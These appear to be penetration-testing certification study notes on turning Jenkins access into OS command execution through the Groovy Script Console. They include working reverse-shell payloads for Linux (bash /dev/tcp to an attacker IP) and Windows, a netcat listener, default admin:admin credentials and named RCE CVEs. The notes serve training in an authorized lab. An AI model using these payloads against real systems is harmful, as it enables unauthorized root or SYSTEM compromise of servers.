![Image](https://images.openai.com/static-rsc-4/Bj0JzgGBWWinBNQfwR_zU6Ib8RVCLttMtoiimaeZurJe49ROwYnmRxpZOJRVc9kKF9gCmsLukDd2NeMo1l4eamTk927ROInpufInemvP9bm_zF8xQ2erbpdetrFqtpw1VRhh7dOP0agdFYG74873MeK091qzyUd5olLjZVU4_2RHJPDkpoqpvLSR9g8aBrH5?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/exd07WHZavjlSa75nOhXWU52ZvO-zgDYds1AZO7sbyvrk188FVWABLNdF3FbGWV5NnulZZl3ZeVFnBo5gTsYklqYqFuSya1VPO8Q6y2dWGi3ufRiShrCmakSJ8AkqaTD6z3-ISSgeCR8zJcR8mRMHws_j0ViDkI7H6iiRqbCNtBhodju7Tvl4XAPWftEkzgi?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/e9-HYy39oTVTZfADTBZwB7x3LC3xvvX8nxlUquFhP-T6JKpvQaNmCEclI2zMl2cNuUBAcT8I8Mw3EGdDhYrwbmkUsT91bbbsvKB1QOG-PNH2jJ1PhhpW55kb6FlCX0WkTJ8ukOIT7PBwpQOAoKRt0-iGsz87ouOye5gL7AupynJ8F6ji6NZV5AfC18JNz0SQ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VRONWuXTzXP3dmYYlROKJpTruhF-iJMVrvJa7HsXHUvHh9YD-b1EC6j3z8eemeBnxSSvJn5KwWKM3yIjjklM5uUacUWlxRNcPvZgY6MG9sAM6EJ5wUbKG537KXMM8Vc_qQYfLaNm4AoZkJfer5E6_WNa2s8YK0T_9cNHwD-YB2DADopq_dPde5iU-7Ian5lX?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/MqaE3QJFlYDVhIH7qePz3DcHuhrgajuAxlBa_CA_unAKn7TtcU60YPUfBIm_zrfjDhGN1BsyGxqQjImH2OLAHjO6i_gMRO2s3L5hdcmIkmXAUa4-umGnPTw03Ht8lXiEruCSTld9X8V-wDINaduqpX8G3odBRF3lU4haYDq_EowAs1eXBi1Lpa0ITcng5Jd7?purpose=fullsize)

---

## 1. Attack Scenario

We've already established:

```text
Target
  ↓
Jenkins identified
  ↓
Weak credentials discovered
  ↓
Jenkins authenticated access
```

The next question is:

> **What can our Jenkins access actually do?**

The quickest route to command execution is often the **Script Console**.

Jenkins' Script Console allows users to execute arbitrary **Groovy scripts inside the Jenkins controller runtime**.

Because Groovy executes within the Jenkins Java environment, it can be abused to execute operating-system commands.

The important privilege consideration is:

```text
Jenkins
   ↓
Script Console
   ↓
Groovy execution
   ↓
OS command execution
   ↓
Jenkins process privileges
```

If Jenkins is running as:

```text
root
```

on Linux, or:

```text
SYSTEM
```

on Windows, command execution can potentially give us that same privilege level.

---

# 2. Jenkins Script Console

The Script Console is available at:

```text
http://jenkins.inlanefreight.local:8000/script
```

The console accepts **Apache Groovy** source code.

### What is Groovy?

Groovy is:

- Object-oriented
    
- Java-compatible
    
- Similar in style to languages such as Python and Ruby
    
- Compiled into Java bytecode
    
- Capable of running on systems with a JRE
    

This is particularly important because Jenkins itself is Java-based.

---

# 3. Testing Command Execution

The module uses the following Groovy code to execute:

```text
id
```

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

### What is happening?

Conceptually:

```text
def cmd = 'id'
       ↓
Command = id

cmd.execute()
       ↓
Start OS process

consumeProcessOutput()
       ↓
Capture output

waitForOrKill()
       ↓
Wait for process

println sout
       ↓
Display command output
```

The resulting output in the module is:

```text
uid=0(root) gid=0(root) groups=0(root)
```

🔥 **This is the critical moment.**

We've confirmed:

```text
Jenkins
   ↓
Groovy Script Console
   ↓
OS command execution
   ↓
root
```

That means we effectively have **root-level command execution** on the underlying Linux host.

---

# 4. Why Script Console Is So Powerful

Think of the Script Console as something more powerful than a normal web-shell input field.

A normal web application might give you:

```text
GET /execute?cmd=id
```

But Jenkins gives you an environment where you can execute **Groovy code inside the Jenkins runtime**.

Therefore:

```text
Authenticated Jenkins access
          ↓
     Script Console
          ↓
     Groovy execution
          ↓
 Java Runtime / OS interaction
          ↓
    System commands
```

This is why administrative access to Jenkins should be treated as potentially **high impact**.

---

# 5. Linux Reverse Shell

Once arbitrary commands can be executed, the module demonstrates obtaining a reverse shell.

The provided Groovy snippet is:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

The architecture is:

```text
Jenkins Server                         Attacker
     │                                    │
     │                                    │
     │──── TCP connection :8443 ─────────>│
     │                                    │
     │<──── commands ─────────────────────│
     │                                    │
     │──── command output ───────────────>│
```

The listener used in the module is:

```bash
nc -lvnp 8443
```

The resulting connection gives:

```text
id

uid=0(root) gid=0(root) groups=0(root)
```

Then:

```bash
/bin/bash -i
```

results in:

```text
root@app02:/var/lib/jenkins3#
```

### CPTS takeaway

The important part isn't memorizing one particular reverse-shell payload.

Understand the chain:

```text
Jenkins credentials
        ↓
Script Console
        ↓
Groovy
        ↓
Runtime.exec()
        ↓
OS command execution
        ↓
Reverse shell
        ↓
Jenkins process privileges
```

---

# 6. Windows Jenkins

The same general concept applies to Jenkins running on Windows.

The module demonstrates direct command execution with:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

This executes:

```text
cmd.exe /c dir
```

and prints the result.

So:

```text
Linux Jenkins
    → /bin/bash

Windows Jenkins
    → cmd.exe /c
```

The underlying principle remains the same:

> **Groovy → operating-system command execution**

---

# 7. Windows Reverse Shell

The module also provides a Java-based reverse shell written in Groovy:

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    }
    catch (Exception e){}
};
p.destroy();
s.close();
```

The important values to understand are:

```text
host → attacker's IP
port → attacker's listener port
cmd  → cmd.exe
```

The module's example uses:

```text
localhost
8044
```

which would need to be changed appropriately for an actual authorized lab environment.

---

# 8. Miscellaneous Jenkins Vulnerabilities

The module then moves away from built-in functionality and discusses **version-specific Jenkins vulnerabilities**.

This is an important distinction:

```text
Built-in functionality
        vs.
Known vulnerability
```

---

## CVE-2018-1999002 + CVE-2019-1003000

The module describes an exploit chain involving:

- **CVE-2018-1999002**
    
- **CVE-2019-1003000**
    

The chain can achieve **pre-authenticated remote code execution** by bypassing script-security protections during script compilation.

The module states that the vulnerability involves Jenkins' **dynamic routing** and can bypass the **Overall / Read ACL**.

The resulting attack can allow Groovy code to:

```text
Download malicious JAR
       ↓
Execute malicious JAR
       ↓
Code execution on Jenkins master
```

The module identifies:

```text
Affected example:
Jenkins 2.137
```

### Important CPTS concept

This demonstrates why **version enumeration matters**.

You don't simply ask:

> "Is Jenkins running?"

You also want:

> "Which Jenkins version is running?"

Because Jenkins exploits are often **version-specific**.

---

# 9. Jenkins 2.150.2 Vulnerability

The module describes another vulnerability affecting:

```text
Jenkins 2.150.2
```

The attack requires:

- Authentication
    
- **JOB creation privileges**
    
- **BUILD privileges**
    

The vulnerability can allow code execution through **Node.js**.

An interesting configuration scenario is when anonymous users are enabled.

According to the module, anonymous users have:

```text
JOB creation
BUILD privileges
```

by default in the described scenario.

Therefore:

```text
Anonymous access
       ↓
JOB creation
       +
BUILD privileges
       ↓
Potential code execution
```

This is a great example of why **authorization configuration** matters just as much as authentication.

---

# 10. Version-Specific Exploitation

The module makes an important point:

> Several working RCE exploits exist for Jenkins, but they are version-specific.

At the time the module was written, the current LTS version was:

```text
2.303.1
```

and it fixed the two vulnerabilities discussed above.

### CPTS methodology

When you identify a Jenkins version:

```text
Jenkins identified
       ↓
Enumerate version
       ↓
Search known vulnerabilities
       ↓
Determine affected versions
       ↓
Check authentication requirements
       ↓
Check required privileges
       ↓
Select appropriate exploit
```

Don't blindly throw exploits at the target.

---

# 11. Built-in Functionality vs CVE

This distinction is extremely important.

### Method 1 — Built-in functionality

```text
Weak credentials
       ↓
Administrator access
       ↓
Script Console
       ↓
Groovy
       ↓
RCE
```

No vulnerability necessarily needs to be exploited.

You're abusing **legitimate administrative functionality**.

### Method 2 — Vulnerability exploitation

```text
Jenkins version
       ↓
Identify vulnerable version
       ↓
CVE
       ↓
Exploit
       ↓
Potential RCE
```

This may work even without full administrative access depending on the vulnerability.

---

# 12. Complete Jenkins Attack Flow

Here's the flow I would memorize for CPTS:

```text
                         ┌────────────────────┐
                         │ Jenkins Discovery  │
                         └─────────┬──────────┘
                                   │
                                   ▼
                         ┌────────────────────┐
                         │ Fingerprint Login  │
                         └─────────┬──────────┘
                                   │
                                   ▼
                         ┌────────────────────┐
                         │ Enumerate Version  │
                         └─────────┬──────────┘
                                   │
                       ┌───────────┴───────────┐
                       ▼                       ▼
              ┌─────────────────┐     ┌──────────────────┐
              │ Weak Credentials│     │ Known CVE        │
              └────────┬────────┘     └────────┬─────────┘
                       │                       │
                       ▼                       ▼
              ┌─────────────────┐     ┌──────────────────┐
              │ Jenkins Access  │     │ Version-specific │
              └────────┬────────┘     │ exploitation     │
                       │              └────────┬─────────┘
                       ▼                       │
              ┌─────────────────┐              │
              │ Script Console  │◄─────────────┘
              └────────┬────────┘
                       │
                       ▼
              ┌─────────────────┐
              │ Groovy Execution│
              └────────┬────────┘
                       │
                       ▼
              ┌─────────────────┐
              │ OS Command RCE  │
              └────────┬────────┘
                       │
                       ▼
              ┌─────────────────┐
              │ Process Privs   │
              └────────┬────────┘
                       │
              ┌────────┴────────┐
              ▼                 ▼
            root              SYSTEM
              │                 │
              └────────┬────────┘
                       ▼
                Host Compromise
```

---

# 🔥 High-Value CPTS Points

### Jenkins Script Console

```text
/script
```

allows Groovy scripts to execute within the Jenkins controller runtime.

### Groovy

- Java-compatible
    
- Object-oriented
    
- Compiled into Java bytecode
    
- Runs where a JRE is installed
    

### Critical command-execution concept

```groovy
def cmd = 'id'
def proc = cmd.execute()
```

The `.execute()` functionality is the key concept.

### Linux

```text
id
→ uid=0(root)
```

means Jenkins is running as root in the module's example.

### Windows

```groovy
cmd.exe /c dir
```

demonstrates command execution on a Windows Jenkins installation.

---

# 🧪 Enumeration → Exploitation Checklist

## Discovery

-  Identify Jenkins
    
-  Identify web port
    
-  Check `8080`
    
-  Check `5000`
    
-  Fingerprint Jenkins login page
    
-  Identify Jenkins version
    

## Authentication

-  Determine authentication mechanism
    
-  Check whether authentication is enabled
    
-  Check weak/default credentials
    
-  Determine anonymous permissions
    
-  Determine user privileges
    

## Post-authentication

-  Check administrative functionality
    
-  Check `/script`
    
-  Determine whether Script Console is accessible
    
-  Test command execution in the authorized lab
    
-  Determine effective OS privileges
    

## Vulnerability research

-  Identify exact Jenkins version
    
-  Map version to known CVEs
    
-  Determine authentication requirements
    
-  Determine required privileges
    
-  Validate applicability before exploitation
    

---

# 🧠 Final Cheat Sheet

```text
JENKINS
│
├── Java CI/CD automation server
│
├── Important ports
│   ├── 8080 → Jenkins web interface
│   └── 5000 → master/slave communication
│
├── Authentication
│   ├── Jenkins DB
│   ├── LDAP
│   ├── Unix users
│   ├── Servlet container
│   └── None
│
├── Weak credentials
│   └── admin:admin
│
├── Script Console
│   └── /script
│
├── Script language
│   └── Groovy
│
├── Command execution
│   ├── Linux → id
│   └── Windows → cmd.exe /c dir
│
├── Potential result
│   ├── Linux → root
│   └── Windows → SYSTEM
│
├── RCE vulnerabilities
│   ├── CVE-2018-1999002
│   ├── CVE-2019-1003000
│   └── Jenkins 2.150.2 issue
│
└── Core lesson
    └── Jenkins admin access can quickly become RCE
```

## ⭐ What I'd remember for the CPTS exam

**The single most important chain is:**

> **Weak Jenkins credentials → authenticated access → Script Console → Groovy → OS command execution → Jenkins process privileges → potential root/SYSTEM compromise.**

And the second major lesson is:

> **Always enumerate the Jenkins version and authorization configuration because Jenkins RCE vulnerabilities are often version- and privilege-specific.**